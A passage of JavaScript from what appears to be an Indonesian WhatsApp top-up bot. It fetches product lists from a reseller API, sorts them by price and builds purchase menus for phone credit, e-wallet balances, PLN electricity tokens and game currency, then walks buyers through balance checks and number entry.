buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Nominal Pulsa Axis",
rows: row_list_axis
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_token_pln") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_pln = [];
for (let x of res.data.data) {
if (x.code.includes("PLN")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_pln.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal tokennya",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Token Listrik PLN",
rows: row_list_pln
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
 } else if (isListMessage === "topup_saldo_ovo") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_ovo = [];
for (let x of res.data.data) {
if (x.code.includes("OVO")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_ovo.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal saldo",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Topup Saldo Ovo",
rows: row_list_ovo
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_saldo_linkaja") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_linkaja = [];
for (let x of res.data.data) {
if (x.code.includes("LINKAJA")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_linkaja.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal saldo",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Topup Saldo LinkAja",
rows: row_list_linkaja
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_saldo_shoope") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_shoopee = [];
for (let x of res.data.data) {
if (x.code.includes("SHP")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_shoopee.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal saldo",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Topup Saldo ShoopeePay",
rows: row_list_shoopee
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_saldo_gopay") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_gopay = [];
for (let x of res.data.data) {
if (x.code.includes("GOPAY")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_gopay.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal saldo",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Topup Saldo Gopay",
rows: row_list_gopay
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_saldo_dana") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};
if (res.data.result == false) return reply('Server maintenance.')
let myA = [];
let row_list_dana = [];
for (let x of res.data.data) {
if (x.code.includes("DANA")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_dana.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal saldo",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Topup Saldo Dana",
rows: row_list_dana
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_garena_shell") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_gs = [];
for (let x of res.data.data) {
if (x.code.includes("VGR")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_gs.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal voucher",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Voucher Garena Shell",
rows: row_list_gs
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_diamond_ff") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_ff = [];
for (let x of res.data.data) {
if (x.code.includes("FF")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_ff.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal diamond",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Diamond Free Fire",
rows: row_list_ff
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
} else if (isListMessage === "topup_diamond_ml") {
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: apikeyAntlatic,
action: "services"
})
}).then(res => {
const compare = (a, b) => {
const aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
const bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
 
return aPrice - bPrice
};

if (res.data.result == false) return reply('Server maintenance.')

let myA = [];
let row_list_ml = [];
for (let x of res.data.data) {
if (x.code.startsWith("VMLSO")) {
myA.push(x)
}
}

myA.sort(compare);
for (let y of myA) {
row_list_ml.push({
title: y.name+` ${y.status == 'empty' ? '(Kosong)' : ''}`,
rowId: "id=" + y.code + "&harga=" + y.price,
description: `Harga: Rp ${toRupiah(Number(y.price))}`
})
}
var listMessage = {
text: "Silahkan pilih nominal diamond",
buttonText: "ᴘɪʟɪʜ ʟᴀʏᴀɴᴀɴ",
sections: [
{
title: "Diamond Mobile Legends",
rows: row_list_ml
}
]
}
data_topup.session = "PILIH-LIST-GAME";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, listMessage)
})
}
} else if (data_topup.session === "PILIH-LIST-GAME") {
if (isListMessage.includes("TDA")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan kirim nomor hp*\n*wajib berawal dari 628xx tanpa spasi*"})
} else if (isListMessage.includes("XLD")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan kirim nomor hp*\n*wajib berawal dari 628xx tanpa spasi*"})
} else if (isListMessage.includes("AXD")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan kirim nomor hp*\n*wajib berawal dari 628xx tanpa spasi*"})
} else if (isListMessage.includes("SDF")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan kirim nomor hp*\n*wajib berawal dari 628xx tanpa spasi*"})
} else if (isListMessage.includes("IDF")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan kirim nomor hp*\n*wajib berawal dari 628xx tanpa spasi*"})
} else if (isListMessage.includes("XLTF")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan kirim nomor hp*\n*wajib berawal dari 628xx tanpa spasi*"})
} else if (isListMessage.includes("TTF")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan kirim nomor hp*\n*wajib berawal dari 628xx tanpa spasi*"})
} else if (isListMessage.includes("ITF")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan kirim nomor hp*\n*wajib berawal dari 628xx tanpa spasi*"})
} else if (isListMessage.includes("STF")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan kirim nomor hp*\n*wajib berawal dari 628xx tanpa spasi*"})
} else if (isListMessage.includes("AXTF")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan kirim nomor hp*\n*wajib berawal dari 628xx tanpa spasi*"})
} else if (isListMessage.includes("PLN")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan kirim nomor*\n*meteran/id pelanggan*"})
} else if (isListMessage.includes("OVO")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan Kirim Nomor Ovo Kamu*\n*Wajib Berawal dari 628xx*"})
} else if (isListMessage.includes("LINKAJA")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan Kirim Nomor LinkAja Kamu*\n*Wajib Berawal dari 628xx*"})
} else if (isListMessage.includes("SHP")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan Kirim Nomor Shoope Kamu*\n*Wajib Berawal dari 628xx*"})
} else if (isListMessage.includes("GOPAY")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan Kirim Nomor Gopay Kamu*\n*Wajib Berawal dari 628xx*"})
} else if (isListMessage.includes("DANA")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "*Silahkan Kirim Nomor Dana Kamu*\n*Wajib Berawal dari 628xx*"})
} else if (isListMessage.includes("VGR")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "Silahkan Kirim *No Hp Kamu*\n*Wajib berawal dari 628xx*"})
} else if (isListMessage.includes("FF")) {
if (cekSaldo(sender, db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply(`Maaf *${cekUser("name", sender)}* saldo kamu kurang`)
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "Silahkan Kirim *ID Free Fire*"})
} else if (isListMessage.includes("VMLSO")) {
if (cekSaldo(sender ,db_saldo) < Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1])) return reply("Maaf saldo anda kurang")
data_topup.data.id_topup = msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("id=")[1].split("&harga=")[0];
data_topup.data.harga_topup = Number(msg.message.listResponseMessage.singleSelectReply.selectedRowId.split("&harga=")[1]);
data_topup.data.produk_topup = msg.message.listResponseMessage.title
data_topup.session = "INPUT-GAME-ID";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
ronzz.sendMessage(from, { text: "Silahkan Kirim *ID Mobile Legends*"})
}
} else if (data_topup.session === "INPUT-GAME-ID") {
if (data_topup.data.id_topup.includes("TDA")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka dan tanpa spasi!")
data_topup.data.id_target = '0'+Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* 0${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("XLD")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka dan tanpa spasi!")
data_topup.data.id_target = '0'+Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("AXD")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka dan tanpa spasi!")
data_topup.data.id_target = '0'+Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("SDF")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka dan tanpa spasi!")
data_topup.data.id_target = '0'+Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("IDF")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka dan tanpa spasi!")
data_topup.data.id_target = '0'+Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
reply(`「 *KONFIRMASI-TOPUP* 」

*ID:* ${data_topup.ID}
*Number:* @${data_topup.number.split("@")[0]}
*Harga:* Rp${toRupiah(data_topup.data.harga_topup)}
*Layanan:* ${data_topup.data.produk_topup}
*No Tujuan:* ${data_topup.data.id_target}

Apakah data tersebut sudah benar? akan gagal apabila terdapat kesalahan input.

_Ketik *Y* untuk melanjutkan, *N* untuk mengulangi inputan_`)
} else if (data_topup.data.id_topup.includes("XLTF")) {
if (chats.length === 0) return;
if (isNaN(chats)) return reply("Hanya angka dan tanpa spasi!")
data_topup.data.id_target = '0'+Number(chats);
data_topup.session = "KONFIRMASI-TOPUP";
fs.writeFileSync(topupPath + sender.split("@")[0] + ".json", JSON.stringify(data_topup, null, 3))
